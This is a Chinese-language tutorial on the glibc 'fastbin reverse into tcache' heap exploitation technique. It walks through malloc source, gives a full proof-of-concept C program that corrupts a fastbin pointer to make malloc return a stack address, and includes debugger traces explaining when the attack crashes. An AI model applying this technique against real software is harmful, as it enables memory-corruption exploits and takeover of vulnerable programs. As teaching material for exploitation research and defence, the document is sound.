# 简介
在前面的malloc源码中我们可以知道，当fastbin链表有free chunk而对应大小的tcachebin链表未满时会将fastbin中的chunk移动到fastbin中。由于fastbin和tcachebin都是采用LIFO（后入先出）的机制，因此放入之前和之后chunk的顺序正好相反，我们可以使用这一点来控制任意内存。

# 漏洞影响版本
加入并开启tcache机制的所有glibc

# POC
## 相关的_int_malloc源码分析
为了让之后的文章解读更加准确，我们先来回顾一下fastbin chunk移入到tcachebin中的过程，触发移入要求：

1. 申请堆块的大小在fastbin范围中
2. 对应大小的tcachebin链表为空（因为在申请时tcachebin的优先级最高）
3. 对应大小的fastbin链表上有至少两个空闲的chunk
4. 在向fastbin申请chunk后链表上仍然有free chunk（呼应上一点）
5. 不能触发任何异常

```c
  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))//要求在fastbin范围内
    {
      idx = fastbin_index (nb);//获取fastbin索引
      mfastbinptr *fb = &fastbin (av, idx);//获取对应main_arena指针
      mchunkptr pp;
      victim = *fb; //获取堆块地址（在链表上没有堆块的情况下victim==0）

      if (victim != NULL) //判断是否有空闲的chunk
	{
	  if (SINGLE_THREAD_P) //单线程执行
	    *fb = victim->fd; //取出最后进入fastbin的chunk即victim
	  else //多线程执行
	    REMOVE_FB (fb, pp, victim); //略
	  if (__glibc_likely (victim != NULL)) //主要针对多线程的安全性检查
	    {
	      size_t victim_idx = fastbin_index (chunksize (victim)); 
	      if (__builtin_expect (victim_idx != idx, 0)) //检查victim的size是否被恶意篡改
		malloc_printerr ("malloc(): memory corruption (fast)");//如篡改则触发异常
	      check_remalloced_chunk (av, victim, nb); //一个不太重要但又细致的检查
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb); //获取tcachebin索引
	      if (tcache && tc_idx < mp_.tcache_bins)
		{//tcache机制初始化且索引在tcache范围内
		  mchunkptr tc_victim;

		  /* While bin not empty and tcache not full, copy chunks.  */
		  while (tcache->counts[tc_idx] < mp_.tcache_count //判断tcache是否已满
			 && (tc_victim = *fb) != NULL) //判断fastbin链表上是否仍有空闲的chunk
		    {
		      if (SINGLE_THREAD_P)
			*fb = tc_victim->fd; //单线程执行，对tc_victim开始解链
		      else
			{ //多线程执行
			  REMOVE_FB (fb, pp, tc_victim);
			  if (__glibc_unlikely (tc_victim == NULL))
			    break;
			}
		      tcache_put (tc_victim, tc_idx); //向tcachebin放入tc_victim
		    }
		}
#endif
	      void *p = chunk2mem (victim);
	      alloc_perturb (p, bytes);
	      return p; //返回申请的victim
	    }
	}
    }
```

```c
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx) //传入的tc_victim和tc_idx
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk); //获取free chunk的user data
  assert (tc_idx < TCACHE_MAX_BINS); //tc_idx一定小于TCACHE_MAX_BINS

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache; //设置tc_victim的key标志位

  e->next = tcache->entries[tc_idx]; //设置tc_victim的next标志位
  tcache->entries[tc_idx] = e; //插入tcachebin
  ++(tcache->counts[tc_idx]); //对应的计数++
}
```

从上面两段代码中可以看出：

fastbin：chunk1->chunk2->chunk3<-0

则放入tcachebin中：chunk3->chunk2->chunk1<-0

## POC源码分析
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
  setbuf(stdout, NULL);

  printf(
    "\n"
    "This attack is intended to have a similar effect to the unsorted_bin_attack,\n"
    "except it works with a small allocation size (allocsize <= 0x78).\n"
    "The goal is to set things up so that a call to malloc(allocsize) will write\n"
    "a large unsigned value to the stack.\n\n"
  );

  // Allocate 14 times so that we can free later.
  char* ptrs[14];
  size_t i;
  for (i = 0; i < 14; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf(
    "First we need to free(allocsize) at least 7 times to fill the tcache.\n"
    "(More than 7 times works fine too.)\n\n"
  );

  // Fill the tcache.
  for (i = 0; i < 7; i++) {
    free(ptrs[i]);
  }

  char* victim = ptrs[7];
  printf(
    "The next pointer that we free is the chunk that we're going to corrupt: %p\n"
    "It doesn't matter if we corrupt it now or later. Because the tcache is\n"
    "already full, it will go in the fastbin.\n\n",
    victim
  );
  free(victim);

  printf(
    "Next we need to free between 1 and 6 more pointers. These will also go\n"
    "in the fastbin. If the stack address that we want to overwrite is not zero\n"
    "then we need to free exactly 6 more pointers, otherwise the attack will\n"
    "cause a segmentation fault. But if the value on the stack is zero then\n"
    "a single free is sufficient.\n\n"
  );

  // Fill the fastbin.
  for (i = 8; i < 14; i++) {
    free(ptrs[i]);
  }

  // Create an array on the stack and initialize it with garbage.
  size_t stack_var[6];
  memset(stack_var, 0xcd, sizeof(stack_var));

  printf(
    "The stack address that we intend to target: %p\n"
    "It's current value is %p\n",
    &stack_var[2],
    (char*)stack_var[2]
  );

  printf(
    "Now we use a vulnerability such as a buffer overflow or a use-after-free\n"
    "to overwrite the next pointer at address %p\n\n",
    victim
  );

  //------------VULNERABILITY-----------

  // Overwrite linked list pointer in victim.
  *(size_t**)victim = &stack_var[0];

  //------------------------------------

  printf(
    "The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"
  );

  // Empty tcache.
  for (i = 0; i < 7; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf(
    "Let's just print the contents of our array on the stack now,\n"
    "to show that it hasn't been modified yet.\n\n"
  );

  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  printf(
    "\n"
    "The next allocation triggers the stack to be overwritten. The tcache\n"
    "is empty, but the fastbin isn't, so the next allocation comes from the\n"
    "fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"
    "Those 7 chunks are copied in reverse order into the tcache, so the stack\n"
    "address that we are targeting ends up being the first chunk in the tcache.\n"
    "It contains a pointer to the next chunk in the list, which is why a heap\n"
    "pointer is written to the stack.\n"
    "\n"
    "Earlier we said that the attack will also work if we free fewer than 6\n"
    "extra pointers to the fastbin, but only if the value on the stack is zero.\n"
    "That's because the value on the stack is treated as a next pointer in the\n"
    "linked list and it will trigger a crash if it isn't a valid pointer or null.\n"
    "\n"
    "The contents of our array on the stack now look like this:\n\n"
  );

  malloc(allocsize);

  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  char *q = malloc(allocsize);
  printf(
    "\n"
    "Finally, if we malloc one more time then we get the stack address back: %p\n",
    q
  );

  assert(q == (char *)&stack_var[2]);

  return 0;
}
```

首先我们需要申请14个大小在fastbin中的堆块（至于为什么是14个之后会说）：

```c
  for (i = 0; i < 14; i++) { //申请14个大小为0x40的堆块
    ptrs[i] = malloc(allocsize);
  }
```

然后我们释放掉7个堆块让其进入tcachebin：

```c
  // Fill the tcache.
  for (i = 0; i < 7; i++) {
    free(ptrs[i]);
  }
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619260706700-96a6a92a-7bf6-42dd-a93b-4505a79d70cc.png)

```c
  char* victim = ptrs[7]; //victim是我们要控制的地方
  free(victim); //当我们free victim之后其会被放到fastbin中(victim是第一个进入fastbin的堆块)
```

结果如下：

```c
pwndbg> bin
tcachebins
0x50 [  7]: 0x555555757440 —▸ 0x5555557573f0 —▸ 0x5555557573a0 —▸ 0x555555757350 —▸ 0x555555757300 —▸ 0x5555557572b0 —▸ 0x555555757260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x555555757480 ◂— 0x0
      #victim
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

## 避免触发程序的段错误
接下来是重点，因为此处处理不好会触发程序的段错误：

```c
  printf(
    "Next we need to free between 1 and 6 more pointers. These will also go\n"
    "in the fastbin. If the stack address that we want to overwrite is not zero\n"
    "then we need to free exactly 6 more pointers, otherwise the attack will\n"
    "cause a segmentation fault. But if the value on the stack is zero then\n"
    "a single free is sufficient.\n\n"
  );

  // Fill the fastbin.
  for (i = 8; i < 14; i++) { //接下来我们释放堆块以填充fastbin
    free(ptrs[i]);
  }
```

上面的注释看不懂没关系，此处牵扯到的重点malloc源码如下：

```c
		  /* While bin not empty and tcache not full, copy chunks.  */
		  while (tcache->counts[tc_idx] < mp_.tcache_count //判断tcache是否已满
			 && (tc_victim = *fb) != NULL) //判断fastbin链表上是否仍有空闲的chunk
		    {
		      if (SINGLE_THREAD_P)
			*fb = tc_victim->fd; //单线程执行，对tc_victim开始解链
		      else
			{ //多线程执行
			  REMOVE_FB (fb, pp, tc_victim);
			  if (__glibc_unlikely (tc_victim == NULL))
			    break;
			}
		      tcache_put (tc_victim, tc_idx); //向tcachebin放入tc_victim
		    }
```

### 第一个例子
```c
//将原POC的53-56行改为如下内容：
  // Fill the fastbin.
  for (i = 8; i < 9; i++) { //这里发生变动
    free(ptrs[i]);
  }
```

编译完成之后引入malloc源码对代码82行下断点后进入调试：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619407394237-6a8c1201-8972-44fa-b3ab-b9bc59e823dc.png)

> *(size_t**)victim = &stack_var[0];
>

可以看到victim已经挂上了fastbin链表中，将tcachebin清空后效果如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619407728260-6e960219-69a6-4acb-8d4e-fad28b5f9aa9.png)

接下来我们单步步入malloc(allocsize)，这里是我们研究的重点：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619425432909-4bc86d6f-2f97-401b-a800-a868a24cd1f2.png)

如上图所示，victim（这里指的是0x5555557574d0而不是0x7fffffffdd40）已经从fastbin中解链，现在就要进行对余下的free chunk进行整理，第一次整理之后：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619425747206-b8da5d1f-ad13-43c9-a587-3cc2003c20e3.png)

第二次整理后：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619425829569-0a81e975-38db-4428-94f8-a77153bb013a.png)

看一下上面的图，从fastbin链表中可以知道0xcdcdcdcdcdcdcdcd被当作一个堆块链入，主要看会造成段错误的地方：

```c
		  /* While bin not empty and tcache not full, copy chunks.  */
		  while (tcache->counts[tc_idx] < mp_.tcache_count //判断tcache是否已满
			 && (tc_victim = *fb) != NULL) //判断fastbin链表上是否仍有空闲的chunk
		    { //进入if语句
		      if (SINGLE_THREAD_P)
			*fb = tc_victim->fd; //单线程执行，对tc_victim开始解链
		      else
			{ //多线程执行
			  REMOVE_FB (fb, pp, tc_victim);
			  if (__glibc_unlikely (tc_victim == NULL))
			    break;
			}
		      tcache_put (tc_victim, tc_idx); //向tcachebin放入tc_victim
		    }
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619426045692-ff06ac77-e056-467d-8d9a-d657b0946828.png)

如上图所示，由于tc_victim是一个无效的地址，因此在执行*fb = tc_victim->fd;会直接崩溃：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619426129541-094af4a3-48b5-46d9-8260-2e5543331045.png)

### 第二个例子
现在我们将代码更改为：

```c
	//......
  // Fill the fastbin.
  for (i = 8; i < 9; i++) { //更改这里
    free(ptrs[i]);
  }

  // Create an array on the stack and initialize it with garbage.
  size_t stack_var[6];
  memset(stack_var, 0x00, sizeof(stack_var)); //更改这里
 	//......
}
```

编译之后我们再来看看程序是否仍会崩溃（对118行下断点调试），来到之前崩溃的地方：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619427038923-af9baf96-cec1-417f-b72d-7932c19bd220.png)

仔细观察，这里fastbin链表和之前的并不一样：

```c
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x7fffffffdd40 ◂— 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
pwndbg> 
--------------------------------------------------------------
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x7fffffffdd40 -> 0xcdcdcdcdcdcdcdcd
0x60: 0x0
0x70: 0x0
0x80: 0x0
pwndbg> 
```

继续：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619427267249-d71575df-61b8-4d05-8878-c4ac332d2d49.png)

由于0x7fffffffdd40栈上的地址为空，因此fastbin到这里就会结束而不是继续向其中放入堆块或崩溃：

```c
		  /* While bin not empty and tcache not full, copy chunks.  */
		  while (tcache->counts[tc_idx] < mp_.tcache_count 
			 && (tc_victim = *fb) != NULL)  //fastbin链上为空，不会再次进入此循环
		    {
		      if (SINGLE_THREAD_P)
			*fb = tc_victim->fd; 
		      else
			{ //多线程执行
			  REMOVE_FB (fb, pp, tc_victim);
			  if (__glibc_unlikely (tc_victim == NULL))
			    break;
			}
		      tcache_put (tc_victim, tc_idx); 
		    }
```

# 利用方式（总结）
当我们利用UAF或堆溢出修改某一个fastbin堆块的fd指针指向某一个想要可控的地址后（之后我们称之为victim），malloc管理器会自动认为victim被释放到fastbin中，因此在实战过程中要注意victim地址处的内容是否为空，因为这将决定程序是否崩溃。

